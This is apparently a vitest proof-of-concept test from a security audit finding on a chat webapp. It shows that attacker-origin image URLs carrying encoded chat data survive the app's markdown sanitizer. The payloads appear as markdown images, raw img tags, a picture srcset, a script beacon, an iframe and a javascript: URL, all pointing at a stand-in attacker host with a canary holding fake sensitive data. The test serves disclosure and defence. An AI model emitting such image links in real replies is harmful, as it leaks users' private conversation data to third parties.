// @vitest-environment jsdom
/**
 * Finding 6 PoC, part 1 (drop into tinfoil-webapp @ c061681 as tests/poc/image-exfil.test.tsx).
 *
 * Renders an assistant message through the shipped chat markdown pipeline
 * (MessageContent -> react-markdown + remark-math/gfm/breaks -> rehype-raw ->
 * rehype-sanitize(defaultSchema) -> rehype-katex -> custom components) and
 * checks which remote image elements come out. No shipped file is modified.
 *
 * Stubs: the metadata-client (favicon / link-preview enclave calls) is mocked so
 * the test makes no network calls, and ResizeObserver is stubbed for jsdom.
 * Neither touches the image rendering path.
 *
 * The rendered DOM is written to $POC_OUT/rendered-message.html for part 2
 * (browser.mjs), which loads it in Chromium under the production CSP.
 */
import { MessageContent } from '@/components/chat/renderers/components/MessageContent'
import { cleanup, render, waitFor } from '@testing-library/react'
import { mkdirSync, writeFileSync } from 'node:fs'
import path from 'node:path'
import { afterAll, afterEach, beforeAll, expect, it, vi } from 'vitest'

vi.mock('@/services/inference/metadata-client', () => ({
  fetchFavicon: () => Promise.resolve(null),
  fetchLinkMetadata: () => Promise.reject(new Error('mocked')),
}))
beforeAll(() =>
  vi.stubGlobal('ResizeObserver', class { observe() {} disconnect() {} }),
)
afterAll(() => vi.unstubAllGlobals())
afterEach(cleanup)

const ATTACKER = process.env.POC_ATTACKER_ORIGIN ?? 'https://127.0.0.1:48443'
const OUT = process.env.POC_OUT ?? '/tmp/poc06'
// Canary standing in for chat context the injected instruction told the model to encode.
const CANARY = encodeURIComponent('CANARY prior-turn: "Jane Roe, dx HIV 2023, SSN 000-00-0000"')

async function renderAssistant(content: string) {
  const { container } = render(<MessageContent content={content} isDarkMode={false} />)
  // Wait for the async plugin set (rehype-raw, rehype-sanitize, rehype-katex) to apply.
  await waitFor(() => expect(container.querySelectorAll('.katex').length).toBeGreaterThan(0))
  return container
}
const remote = (u: string) => /^https?:/i.test(u)

it('assistant message: markdown image, raw <img> and <picture><source srcset> survive as remote loads', async () => {
  const content = [
    'Here is the summary you asked for.',
    '',
    `![](${ATTACKER}/x.png?d=${CANARY}&via=markdown)`,
    '',
    `<img src="${ATTACKER}/x.png?d=${CANARY}&via=raw-img">`,
    '',
    `<picture><source srcset="${ATTACKER}/x.png?d=${CANARY}&via=srcset"><img src="${ATTACKER}/x.png?d=${CANARY}&via=picture-fallback"></picture>`,
    '',
    // Negative controls inside model output: must not survive the sanitizer / CSP.
    `<script>new Image().src="${ATTACKER}/ctl?via=inline-script-in-message"</script>`,
    `<iframe src="${ATTACKER}/ctl?via=iframe-in-message"></iframe>`,
    `![](javascript:alert(1))`,
    '',
    '$$E=mc^2$$',
  ].join('\n')
  const c = await renderAssistant(content)
  const imgs = [...c.querySelectorAll('img')].map((i) => i.getAttribute('src') ?? '')
  const srcsets = [...c.querySelectorAll('source')].map((s) => s.getAttribute('srcset') ?? '')
  console.log('[poc] <img src>      :', imgs)
  console.log('[poc] <source srcset>:', srcsets)
  console.log('[poc] <script>/<iframe> left in DOM:', c.querySelectorAll('script,iframe').length)
  expect(imgs).toContain(`${ATTACKER}/x.png?d=${CANARY}&via=markdown`)
  expect(imgs).toContain(`${ATTACKER}/x.png?d=${CANARY}&via=raw-img`)
  expect(srcsets).toContain(`${ATTACKER}/x.png?d=${CANARY}&via=srcset`)
  expect(imgs.some((s) => s.startsWith('javascript:'))).toBe(false)
  expect(c.querySelectorAll('script,iframe').length).toBe(0)
  mkdirSync(OUT, { recursive: true })
  writeFileSync(path.join(OUT, 'rendered-message.html'), c.innerHTML)
  console.log('[poc] wrote', path.join(OUT, 'rendered-message.html'))
})

it('negative control: an honest answer (no image syntax) and a data: image produce no remote load', async () => {
  const c = await renderAssistant(
    'Your SSN is not something I will repeat.\n\n![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)\n\n$$x$$',
  )
  const urls = [
    ...[...c.querySelectorAll('img')].map((i) => i.getAttribute('src') ?? ''),
    ...[...c.querySelectorAll('source')].map((s) => s.getAttribute('srcset') ?? ''),
  ]
  console.log('[poc] control remote URLs:', urls.filter(remote))
  expect(urls.filter(remote)).toEqual([])
})
